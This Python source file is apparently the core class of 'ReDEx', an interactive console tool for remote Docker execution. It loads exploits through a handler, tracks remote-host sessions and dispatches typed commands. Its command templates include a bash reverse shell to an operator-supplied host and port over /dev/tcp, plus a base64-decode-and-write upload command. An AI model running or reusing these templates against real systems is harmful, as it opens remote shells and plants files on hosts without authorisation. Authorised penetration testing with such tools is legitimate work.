from rich.console import Console
from rich.prompt import Prompt

from redex.utils.constants import *
from redex.utils.session import Session, ContainerDatas
from redex.data.container import DEFAULT_CONTAINER_DATA
from redex.utils.command import RedexCommands, merge_args
from redex.data.exploit import ExploitHandler


class RemoteDockerExecution(object):
    """**Remote Docker Execution**

    """
    def __init__(self) -> None:
        self.console = Console(color_system="truecolor")
        self.welcome_msg()

        # Initialize a default container data dictionary using the default one
        self.container_data = ContainerDatas(DEFAULT_CONTAINER_DATA)

        # Initialized the Exploit handler
        self.exploit_hdl = ExploitHandler()

        # Initialize a number of variables used for the current session
        self.session = Session(s_exploits=self.exploit_hdl)
        self.session.s_names.append(self.session.s_name)

        self.exec_created = False
        self.command_types = {
            "revshell" : 'bash -i >& /dev/tcp/{:s}/{:d} 0>&1',
            "upload" : 'echo {:s} | base64 -d >> file{:s}'
        }

        self.printable_exploit = self.session.s_exploit.lower()

        # Take all the commands
        self.commands = RedexCommands()

        # Setup the script executor to None. It will be filled
        # only by using the load command
        self.script_executor = None
    
    def welcome_msg(self) -> None:
        self.console.clear()
        self.console.print(APP_NAME, style="bold yellow")
        self.console.print(
            "[u]Welcome to Remote Docker Execution - ReDEx v1.0.0 by Haveel[/u]\n",
            style="purple"
        )
        self.console.print(INFO + "\n\n")
        if len(BUGS) > 0:
            self.console.print(
                "Bugs that needs to be fixed:\n" + "".join(BUGS) + "\n\n"
            )

    def run(self) -> None:
        """ Actually runs the entire ReDEx tool """
        # Since the command line should appear until an error occurs
        # or until the user does not quit the application, we need
        # to start an infinite while loop.
        while True:
            try:

                if self.session.s_rhost != "0.0.0.0":
                    s_command = self.session.s_command
                    command = s_command if s_command in self.command_types  else "custom"
                    msg = f"([blue]{command}[/blue]:[yellow]{self.printable_exploit}[/yellow])"
                else:
                    msg = ""

                cmd = Prompt.ask(f">>> {msg}")

                # Take the name of the command. If the user has also given
                # a number of arguments then, we need to split the command
                # and runs the respective function
                splitted_cmd = cmd.split()
                command_name = splitted_cmd[0]
                if len(splitted_cmd) > 1:
                    command_args = merge_args(splitted_cmd[1:])
                    self.commands[command_name](self, *command_args)
                    continue

                self.commands[command_name](self)
            
            except KeyboardInterrupt: self.commands['quit'](self)
            except KeyError: self.console.print(
                f"Command '{cmd}' does not exists!!", style="bold yellow")
            except Exception as e:
                print(e)
                self.console.print(f"Command Failed!", style="bold red")
